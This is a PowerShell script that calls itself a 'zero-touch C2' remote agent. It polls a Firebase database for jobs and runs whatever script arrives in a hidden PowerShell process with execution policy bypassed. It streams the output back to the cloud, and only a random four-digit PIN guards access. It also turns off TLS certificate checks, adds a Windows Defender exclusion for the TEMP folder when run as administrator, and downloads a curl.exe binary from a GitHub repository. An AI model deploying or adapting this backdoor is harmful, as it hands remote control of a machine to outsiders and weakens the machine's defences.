param (
    [string]$FirebaseUrl = "https://uat-api-agent-default-rtdb.firebaseio.com/",
    [int]$PollIntervalSec = 5
)

# Force console output encoding to UTF-8
$OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# Enable TLS 1.2 security protocol
try {
    [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192
} catch {}
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

# Configure Windows Defender exclusion on TEMP folder (if running as Administrator)
try {
    $currentUser = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    $isAdmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) {
        Write-Host "[PRE-CHECK] Configuring Windows Defender exclusion for TEMP folder..." -ForegroundColor DarkGray
        Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
    }
} catch {}

# Function to automatically ensure curl.exe is available
function Ensure-CurlInstalled {
    try { [System.Net.ServicePointManager]::SecurityProtocol = 3072 } catch {}
    
    $hasGlobalCurl = $null
    try { $hasGlobalCurl = Get-Command curl.exe -ErrorAction SilentlyContinue } catch {}
    if ($hasGlobalCurl) {
        return
    }

    $tempCurlPath = Join-Path $env:TEMP "curl.exe"
    if (Test-Path $tempCurlPath) {
        return
    }
    
    Write-Host "[PRE-CHECK] curl.exe is missing. Downloading automatically..." -ForegroundColor Yellow
    $downloadUrl = "https://raw.githubusercontent.com/SDPLaos2023/CMD_Remote/main/curl.exe"
    
    try {
        $userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, Gecko) Chrome/120.0.0.0 Safari/537.36"
        Invoke-WebRequest -Uri $downloadUrl -OutFile $tempCurlPath -TimeoutSec 45 -UserAgent $userAgent
        if (Test-Path $tempCurlPath) {
            Write-Host "[SUCCESS] Installed curl.exe into TEMP successfully!" -ForegroundColor Green
        } else {
            throw "Downloaded curl.exe file is empty"
        }
    }
    catch {
        Write-Host "[ERROR] Failed to download curl.exe: $_" -ForegroundColor Red
    }
}

Ensure-CurlInstalled

# Resolve curl executable path
$curlPath = "curl.exe"
$hasGlobalCurl = $null
try { $hasGlobalCurl = Get-Command curl.exe -ErrorAction SilentlyContinue } catch {}
if (-not $hasGlobalCurl) {
    $curlPath = Join-Path $env:TEMP "curl.exe"
}

$utf8NoBom = New-Object System.Text.UTF8Encoding($false)

# Ensure Firebase URL ends with a slash
if ($FirebaseUrl -notlike "*/") {
    $FirebaseUrl = $FirebaseUrl + "/"
}

# ฟังก์ชันสุ่ม PIN 4 หลักพร้อมตรวจสอบความซ้ำซ้อนกับ Firebase RTDB (Anti-Collision Guard)
function Get-UniqueSecretKey {
    param([string]$BaseUrl, [string]$Curl)
    for ($attempt = 0; $attempt -lt 15; $attempt++) {
        $candidate = (Get-Random -Minimum 1000 -Maximum 10000).ToString()
        try {
            $checkUrl = $BaseUrl + "jobs/$candidate.json?shallow=true"
            $existing = & $Curl -s -L -k $checkUrl
            if ([string]::IsNullOrWhiteSpace($existing) -or $existing.Trim() -eq "null") {
                return $candidate
            }
        } catch {
            return $candidate
        }
    }
    return (Get-Random -Minimum 1000 -Maximum 10000).ToString()
}

$SecretKey = Get-UniqueSecretKey -BaseUrl $FirebaseUrl -Curl $curlPath

# Display clean standard console banner
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "                    BB_JAVIS REMOTE (ZERO-TOUCH C2)                   " -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "  -> Remote Secret Key : " -NoNewline -ForegroundColor Gray
Write-Host "[ $SecretKey ]" -NoNewline -ForegroundColor Green
Write-Host " (ACTIVE)" -ForegroundColor Yellow
Write-Host "  -> Connection Status : " -NoNewline -ForegroundColor Gray
Write-Host "Connected to Cloud Board" -ForegroundColor Green
Write-Host "  -> Polling Interval  : " -NoNewline -ForegroundColor Gray
Write-Host "Every $PollIntervalSec seconds" -ForegroundColor White
Write-Host "  -> One-Link URL      : " -NoNewline -ForegroundColor Gray
Write-Host "da.gd/javis" -ForegroundColor Cyan
Write-Host "----------------------------------------------------------------------" -ForegroundColor DarkGray
Write-Host "   * Give the Remote Secret Key above to your controller" -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "  Ready for incoming commands. Press Ctrl+C to stop." -ForegroundColor Gray
Write-Host "======================================================================" -ForegroundColor DarkCyan

# ลงทะเบียน PIN บน Cloud Command Board ป้องกันผู้อื่นสุ่มชน
try {
    $claimUrl = $FirebaseUrl + "jobs/$SecretKey/claim.json"
    $claimBody = '{"claimed_at":"' + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + '","status":"active"}'
    $null = & $curlPath -s -L -k -X PUT -H "Content-Type: application/json" -d $claimBody $claimUrl
} catch {}

Write-Host "`n------------------------------------------------------" -ForegroundColor Cyan
Write-Host "Status: Connected to Command Board. Listening for jobs..." -ForegroundColor Green
Write-Host "------------------------------------------------------" -ForegroundColor Cyan

$lastProcessedJob = ""
$tempJsonPath = Join-Path $env:TEMP "agent_payload_temp.json"

# Main polling loop to listen for commands from Firebase RTDB
while ($true) {
    try {
        $queryUrl = $FirebaseUrl + "jobs/$SecretKey.json"
        $jsonRaw = & $curlPath -s -L -k $queryUrl
        
        $jobs = $null
        if (-not [string]::IsNullOrEmpty($jsonRaw)) {
            $jsonRaw = $jsonRaw.Trim()
            if ($jsonRaw -ne "null" -and $jsonRaw.StartsWith("{")) {
                $jobs = ConvertFrom-Json -InputObject $jsonRaw -ErrorAction SilentlyContinue
            }
        }
        
        if ($jobs -and $jobs -is [System.Management.Automation.PSCustomObject]) {
            # Find the first pending job
            $jobId = $null
            $jobDetails = $null
            foreach ($prop in $jobs.PSObject.Properties) {
                if ($prop.Value.status -eq "pending") {
                    $jobId = $prop.Name
                    $jobDetails = $prop.Value
                    break
                }
            }
            
            # Process incoming job
            if ($jobId -and $jobId -ne $lastProcessedJob) {
                Write-Host "`n[NEW JOB] Received incoming job ID: $jobId" -ForegroundColor Yellow
                
                # Verify Secret Key for safety
                if ($jobDetails.secret_key -ne $SecretKey) {
                    Write-Host " -> Access Denied: Secret Key mismatch! (Skipping job)" -ForegroundColor Red
                    
                    $patchBody = @{
                        status = "failed"
                        exit_code = 403
                        stderr = "Access Denied: Invalid Secret Key (403 Forbidden)"
                        completed_at = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
                    } | ConvertTo-Json -Compress
                    
                    [System.IO.File]::WriteAllText($tempJsonPath, $patchBody, $utf8NoBom)
                    $updateUrl = $FirebaseUrl + "jobs/$SecretKey/$jobId.json"
                    $res = & $curlPath -s -L -k -X PATCH -H "Content-Type: application/json" -d "@$tempJsonPath" $updateUrl
                    if (Test-Path $tempJsonPath) { Remove-Item $tempJsonPath -Force }
                    
                    $lastProcessedJob = $jobId
                    continue
                }
                
                $command = $jobDetails.script_content
                
                # Check for high-risk commands
                if ($command -match "(?i)drop\s+database" -or $command -match "(?i)truncate\s+table") {
                    Write-Host " -> [SECURITY WARNING] High-risk command detected (DROP DATABASE / TRUNCATE TABLE)" -ForegroundColor Yellow
                }

                # Update status to Running
                Write-Host " -> Updating job status: Running..." -ForegroundColor Yellow
                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                $runBody = '{"status":"running","last_heartbeat":"' + $timestamp + '","progress_phase":"Executing command..."}'
                $updateUrl = $FirebaseUrl + "jobs/$SecretKey/$jobId.json"
                $res = & $curlPath -s -L -k -X PATCH -H "Content-Type: application/json" -d $runBody $updateUrl
                
                # Set environment variables for subprocess
                $env:CMD_REMOTE_JOB_ID = $jobId
                $env:CMD_REMOTE_CURL_PATH = $curlPath
                
                Write-Host " -> Executing command..." -ForegroundColor Gray
                
                $stdoutCollector = [System.Collections.Generic.List[string]]::new()
                $stderrCollector = [System.Collections.Generic.List[string]]::new()
                $exitCode = 0
                
                $tempScriptPath = Join-Path $env:TEMP ("remote_script_" + [Guid]::NewGuid().ToString().Substring(0, 8) + ".ps1")
                
                try {
                    # Write script to temporary file in TEMP folder
                    [System.IO.File]::WriteAllText($tempScriptPath, $command, $utf8NoBom)
                    
                    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
                    $processInfo.FileName = "powershell.exe"
                    $processInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$tempScriptPath`""
                    $processInfo.RedirectStandardOutput = $true
                    $processInfo.RedirectStandardError = $true
                    $processInfo.UseShellExecute = $false
                    $processInfo.CreateNoWindow = $true
                    
                    $process = New-Object System.Diagnostics.Process
                    $process.StartInfo = $processInfo
                    
                    # Queue for thread-safe live log streaming
                    $global:CMD_REMOTE_LOG_QUEUE = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
                    
                    $stdoutAction = {
                        if (-not [string]::IsNullOrEmpty($EventArgs.Data)) {
                            $global:CMD_REMOTE_LOG_QUEUE.Enqueue("OUT:" + $EventArgs.Data)
                        }
                    }
                    $stderrAction = {
                        if (-not [string]::IsNullOrEmpty($EventArgs.Data)) {
                            $global:CMD_REMOTE_LOG_QUEUE.Enqueue("ERR:" + $EventArgs.Data)
                        }
                    }
                    
                    $jobStdout = Register-ObjectEvent -InputObject $process -EventName OutputDataReceived -Action $stdoutAction
                    $jobStderr = Register-ObjectEvent -InputObject $process -EventName ErrorDataReceived -Action $stderrAction
                    
                    $null = $process.Start()
                    $process.BeginOutputReadLine()
                    $process.BeginErrorReadLine()
                    
                    $lastStreamingTime = [DateTime]::UtcNow
                    $stdoutTotalLength = 0
                    $stderrTotalLength = 0
                    $maxCharLimit = 500000 # Safeguard against huge buffer
                    
                    while (-not $process.HasExited) {
                        Start-Sleep -Milliseconds 250
                        
                        $line = $null
                        $hasNewLogs = $false
                        while ($global:CMD_REMOTE_LOG_QUEUE.TryDequeue([ref]$line)) {
                            $hasNewLogs = $true
                            if ($line.StartsWith("OUT:")) {
                                $data = $line.Substring(4)
                                if ($stdoutTotalLength -lt $maxCharLimit) {
                                    $stdoutCollector.Add($data)
                                    $stdoutTotalLength += $data.Length
                                }
                            } elseif ($line.StartsWith("ERR:")) {
                                $data = $line.Substring(4)
                                if ($stderrTotalLength -lt $maxCharLimit) {
                                    $stderrCollector.Add($data)
                                    $stderrTotalLength += $data.Length
                                }
                            }
                        }
                        
                        # Update Heartbeat and live output to Firebase every 3 seconds
                        if (([DateTime]::UtcNow - $lastStreamingTime).TotalSeconds -ge 3) {
                            $lastStreamingTime = [DateTime]::UtcNow
                            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                            
                            $patchData = @{
                                last_heartbeat = $timestamp
                                progress_phase = "Executing command..."
                                stdout = ($stdoutCollector -join "`r`n")
                                stderr = ($stderrCollector -join "`r`n")
                            } | ConvertTo-Json -Compress
                            
                            $tempPatchPath = Join-Path $env:TEMP "agent_patch_temp.json"
                            [System.IO.File]::WriteAllText($tempPatchPath, $patchData, $utf8NoBom)
                            $updateUrl = $FirebaseUrl + "jobs/$SecretKey/$jobId.json"
                            $null = & $curlPath -s -L -k -X PATCH -H "Content-Type: application/json" -d "@$tempPatchPath" $updateUrl
                            if (Test-Path $tempPatchPath) { Remove-Item $tempPatchPath -Force }
                        }
                    }
                    
                    $process.WaitForExit()
                    $exitCode = $process.ExitCode
                    
                    # Drain any remaining logs from queue
                    $line = $null
                    while ($global:CMD_REMOTE_LOG_QUEUE.TryDequeue([ref]$line)) {
                        if ($line.StartsWith("OUT:")) {
                            $data = $line.Substring(4)
                            if ($stdoutTotalLength -lt $maxCharLimit) {
                                $stdoutCollector.Add($data)
                                $stdoutTotalLength += $data.Length
                            }
                        } elseif ($line.StartsWith("ERR:")) {
                            $data = $line.Substring(4)
                            if ($stderrTotalLength -lt $maxCharLimit) {
                                $stderrCollector.Add($data)
                                $stderrTotalLength += $data.Length
                            }
                        }
                    }
                }
                catch {
                    $exitCode = 1
                    $stderrCollector.Add("Execution error: $_")
                }
                finally {
                    # Unregister event handlers to free resources
                    if ($jobStdout) {
                        try { Unregister-Event -SourceIdentifier $jobStdout.Name -ErrorAction SilentlyContinue } catch {}
                    }
                    if ($jobStderr) {
                        try { Unregister-Event -SourceIdentifier $jobStderr.Name -ErrorAction SilentlyContinue } catch {}
                    }
                    
                    Remove-Item Variable:\CMD_REMOTE_LOG_QUEUE -ErrorAction SilentlyContinue
                    if (Test-Path $tempScriptPath) { Remove-Item $tempScriptPath -Force }
                    Remove-Item Env:\CMD_REMOTE_JOB_ID -ErrorAction SilentlyContinue
                    Remove-Item Env:\CMD_REMOTE_CURL_PATH -ErrorAction SilentlyContinue
                }
                
                # Push final execution result to Firebase RTDB
                $finalStatus = if ($exitCode -eq 0) { "completed" } else { "failed" }
                Write-Host " -> Job execution finished: $finalStatus (Exit Code: $exitCode)" -ForegroundColor Green
                
                $finalBody = @{
                    status = $finalStatus
                    exit_code = $exitCode
                    stdout = ($stdoutCollector -join "`r`n")
                    stderr = ($stderrCollector -join "`r`n")
                    completed_at = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
                } | ConvertTo-Json -Compress
                
                [System.IO.File]::WriteAllText($tempJsonPath, $finalBody, $utf8NoBom)
                $updateUrl = $FirebaseUrl + "jobs/$SecretKey/$jobId.json"
                $res = & $curlPath -s -L -k -X PATCH -H "Content-Type: application/json" -d "@$tempJsonPath" $updateUrl
                
                if (Test-Path $tempJsonPath) { Remove-Item $tempJsonPath -Force }
                $lastProcessedJob = $jobId
            }
        }
    }
    catch {
        Write-Host "[WARNING] Error connecting to Firebase (Retrying...): $_" -ForegroundColor DarkYellow
    }
    
    Start-Sleep -Seconds $PollIntervalSec
}
